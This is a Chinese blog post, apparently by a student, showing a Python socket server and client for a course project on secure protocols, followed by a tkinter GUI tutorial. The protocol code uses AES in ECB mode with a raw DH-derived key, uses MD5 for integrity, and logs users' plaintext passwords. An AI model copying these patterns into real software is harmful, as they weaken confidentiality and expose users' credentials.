write_log(log_file,text)</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        query_thread1.adduser(sock,username,password)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    addr = format(addr[0])</span><br><span class="line">    log_name = &quot;logfile/&quot;+addr+&quot;-log&quot;</span><br><span class="line">    try:</span><br><span class="line">        log_file = open(log_name,&#x27;ab+&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;连接成功&quot;</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;)</span><br><span class="line">    permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    while 1:</span><br><span class="line">        menu(sock)</span><br><span class="line">        fail_number = []</span><br><span class="line">        orign_data = (sock.recv(1084))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            break</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data,log_file,addr)</span><br><span class="line">        if fail != None:</span><br><span class="line">            fail_number.append(fail)</span><br><span class="line">        if len(fail_number)&gt;0:</span><br><span class="line">            fail_meg = &quot;,&quot;.join(fail_number)</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;)</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;)</span><br><span class="line">        </span><br><span class="line">        if data_type == 1:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            transfer_txt(addr,data,log_file)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file)</span><br><span class="line">            else:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file(sock,data,addr,log_file)</span><br><span class="line">        elif data_type ==3:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            register(permission_value,sock,data,query_thread1,log_file,addr,username)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">        4.断开连接</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    transfer_data = []</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced += 1</span><br><span class="line">            transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum))</span><br><span class="line">        for i in range(sliced_sum):</span><br><span class="line">            s.sendall(transfer_data[i])</span><br><span class="line">            time.sleep(0.06)</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+f&quot;正在传输第&#123;i&#125;组 当前运行了&#123;temp:.2f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">        print(&quot;\n&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        # print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        elif choice == &quot;4&quot;:</span><br><span class="line">            print(&quot;程序终止&quot;)</span><br><span class="line">            s.close()</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v1-0"><a href="#v1-0" class="headerlink" title="v1.0"></a>v1.0</h2><p>最终版本! 最大的更新就是给客户端增加了图形化界面 看起来更高级一点<br>而且为了服务图形化界面的逻辑 所以一些客户机和服务机的交互也更改了</p><h3 id="tkinter部分控件学习"><a href="#tkinter部分控件学习" class="headerlink" title="tkinter部分控件学习"></a>tkinter部分控件学习</h3><p>第一次尝试编写图形化界面 这里就选用tkinter库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p>这样短短三行 即可生成一个根窗口 子窗口关闭后根窗口不会关闭 根窗口关闭后子窗口会关闭<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411102146493.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411102146493.png" alt="image.png"></a><br>可以对窗口进行一些简单的操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;1000x800&quot;)  #设置窗口大小</span><br><span class="line">root.iconbitmap(&quot;test.ico&quot;) #设置窗口左上角图标</span><br><span class="line">root.config(bg=&quot;green&quot;)  #设置窗口背景颜色</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111425924.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111425924.png" alt="image.png"></a><br>接下来可以使用相关控件来帮助我们构建</p><h4 id="lable"><a href="#lable" class="headerlink" title="lable"></a>lable</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;600x600&quot;)</span><br><span class="line">root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line"></span><br><span class="line">meg = Label(root,text=&quot;this is a test&quot;)</span><br><span class="line">meg.pack(padx=100,side=&quot;left&quot;)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p>lable控件可以在窗口上显示文字或者图像<br>size可以控制控件在哪里显示 默认是top<br>padx和pady则是代表着和x轴或者y轴的偏移是多少<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111457614.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111457614.png" alt="image.png"></a><br>显示图片的话 最好再加上pillow库来配合 因为tk本身支持的图片格式有点少 只支持png</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;600x600&quot;)</span><br><span class="line">root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line"></span><br><span class="line">temp = Image.open(&quot;1.png&quot;)</span><br><span class="line">temp.thumbnail((100,100)) #如果图片过大的话 可以利用thumbnail来限制图片大小</span><br><span class="line">image = ImageTk.PhotoImage(temp)</span><br><span class="line">meg = Label(root,image=image)</span><br><span class="line">meg.pack(side=&quot;left&quot;,padx=250)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111512583.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111512583.png" alt="image.png"></a></p><h4 id="entry"><a href="#entry" class="headerlink" title="entry"></a>entry</h4><p>这个控件可以在窗口上显示一个输入框 配合lable控件就可以实现引导程序使用者输入变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;600x600&quot;)</span><br><span class="line">root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line"></span><br><span class="line">control1 = Label(root,text=&quot;测试输出&quot;)</span><br><span class="line">control1.pack(side=&quot;left&quot;)</span><br><span class="line">control2 = Entry(root)</span><br><span class="line">control2.pack(side=&quot;left&quot;)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111526024.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411111526024.png" alt="image.png"></a><br>不过这样需要两个控件的位置相匹配 用pack中的padx,pady,side处理一对还好 要是界面需要设计的点多 就会比较杂乱 这里可以使用grid控件来配合</p><h4 id="grid"><a href="#grid" class="headerlink" title="grid"></a>grid</h4><p>grid插件相当于把整个窗口界面转化成了一个二维坐标系<br>row参数用来规定行数 column用来规定列数<br>于是上面用pack需要计算padx和pady来实现的效果 可以简单的用这两个参数来实现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;600x600&quot;)</span><br><span class="line">root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line"></span><br><span class="line">control1 = Label(root,text=&quot;测试输出&quot;)</span><br><span class="line">control1.grid(row=0)</span><br><span class="line">control2 = Entry(root)</span><br><span class="line">control2.grid(row=0,column=1)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121401702.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121401702.png" alt="image.png"></a></p><h4 id="button"><a href="#button" class="headerlink" title="button"></a>button</h4><p>上述控件和button控件组合起来 就可以实现一个简单的账号密码登录界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">var=IntVar()</span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line"># root.geometry(&quot;200x200&quot;)</span><br><span class="line"># root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">    username = entry1.get()</span><br><span class="line">    password = entry2.get()</span><br><span class="line">    if username == &quot;admin&quot; and password == &quot;admin&quot;:</span><br><span class="line">        print(&quot;账号密码正确&quot;)</span><br><span class="line"></span><br><span class="line">Label(root,text=&quot;用户名&quot;,padx=10,pady=10).grid(row=0,sticky=W)</span><br><span class="line">Label(root,text=&quot;密码&quot;).grid(row=1,sticky=E,padx=10,pady=10)</span><br><span class="line"></span><br><span class="line">entry1 = Entry(root)</span><br><span class="line">entry1.grid(row=0,column=1)</span><br><span class="line">entry2 = Entry(root)</span><br><span class="line">entry2.grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">button1 = Button(root,text=&quot;登录&quot;,command=check)</span><br><span class="line">button1.grid(row=0,column=2,rowspan=2,columnspan=2,padx=10)</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121436529.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121436529.png" alt="image.png"></a></p><h4 id="frame"><a href="#frame" class="headerlink" title="frame"></a>frame</h4><p>大部分时候  主窗口的大小都需要提前设置 而非由控件大小来自动规划窗口大小 这个时候控件相对于主窗口就会较小 造成界面的不美观<br>下面这个示例 frame1容器收纳了三个控件 这三个控件的grid控制的是在frame1容器中的位置<br>而frame1的grid控制的则是在主窗口中的位置 这样可以更加方便的设置不同控件的相对位置<br>不过最好使用grid_propagate方法来固定容器的位置 不然随着后续容器中的控件位置发生变化 容器的位置也会发生变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">import time</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;300x100&quot;)</span><br><span class="line"># root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    frame1 = Frame(root)</span><br><span class="line">    </span><br><span class="line">    Label(frame1,text=&quot;ip地址&quot;).grid(row=0,column=0)</span><br><span class="line">    Entry(frame1).grid(row=0,column=1)</span><br><span class="line">    Button(frame1,text=&quot;连接&quot;).grid(row=0,column=2,padx=10)</span><br><span class="line">    </span><br><span class="line">    frame1.grid(padx=50,pady=30)</span><br><span class="line">    </span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121556238.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121556238.png" alt="image.png"></a></p><h4 id="text"><a href="#text" class="headerlink" title="text"></a>text</h4><p>这一个控件的作用和entry相似 只不过entry只能支持一行的输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">import time</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;300x200&quot;)</span><br><span class="line"># root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    text = Text(root,width=40,height=10)</span><br><span class="line">    text.grid(padx=7)</span><br><span class="line">    text.insert(&#x27;1.0&#x27;,&quot;test&quot;)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上述代码中insert负责给文本框写入数据<br>这里的1.0代表的是第一行第0个字符开始写入<br>你也可以使用1.end来表示第一行的最后一个字符<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121944479.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411121944479.png" alt="image.png"></a></p><h4 id="scrollbar"><a href="#scrollbar" class="headerlink" title="scrollbar"></a>scrollbar</h4><p>这个控件主要是配合text使用 在最右边加一个滚动条 看起来美观一点 也方便用户更直观的知道当前文本框中的所处位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">import time</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;300x200&quot;)</span><br><span class="line"># root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line">def main():</span><br><span class="line">    s1 = Scrollbar(root,width=20)</span><br><span class="line">    s1.grid(row=0,column=1,sticky=NS)</span><br><span class="line">    text = Text(root,width=35,height=10,yscrollcommand=s1.set,wrap=CHAR)</span><br><span class="line">    text.grid(row=0,column=0,padx=7)</span><br><span class="line">    text.insert(&#x27;1.0&#x27;,&quot;test&quot;)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>yscrollcommand用来绑定滚动条和text wrap参数用来规定是否自动换行 参数有WORD CHAR NONE三种 第一种是单词换行 第二种是字符换行 第三种是不自动换行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411122030673.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411122030673.png" alt="image.png"></a></p><h4 id="canvas"><a href="#canvas" class="headerlink" title="canvas"></a>canvas</h4><p>这个控件主要用于显示文本 图片等 主要是可以绑定scrollbar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">import time</span><br><span class="line">from PIL import Image, ImageTk</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&quot;安全协议期末大作业设计&quot;)</span><br><span class="line">root.geometry(&quot;300x200&quot;)</span><br><span class="line"># root.iconbitmap(&quot;test.ico&quot;)</span><br><span class="line">def main():</span><br><span class="line">    c1 = Canvas(root,width=280)</span><br><span class="line">    c1.grid(row=0,column=0,sticky=W)</span><br><span class="line">    s1 = Scrollbar(root,width=20,command=c1.yview)</span><br><span class="line">    s1.grid(row=0,column=1,sticky=NS)</span><br><span class="line">    c1.config(yscrollcommand=s1.set)</span><br><span class="line">    </span><br><span class="line">    frame1 = Frame(c1)</span><br><span class="line"></span><br><span class="line">    c1.create_window((0, 0), window=frame1, anchor=&#x27;nw&#x27;)</span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        Label(frame1, text=f&quot;Label &#123;i+1&#125;&quot;).pack()</span><br><span class="line">        </span><br><span class="line">    frame1.update_idletasks()</span><br><span class="line">    c1.config(scrollregion=c1.bbox(&quot;all&quot;))</span><br><span class="line">    </span><br><span class="line">    root.mainloop()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    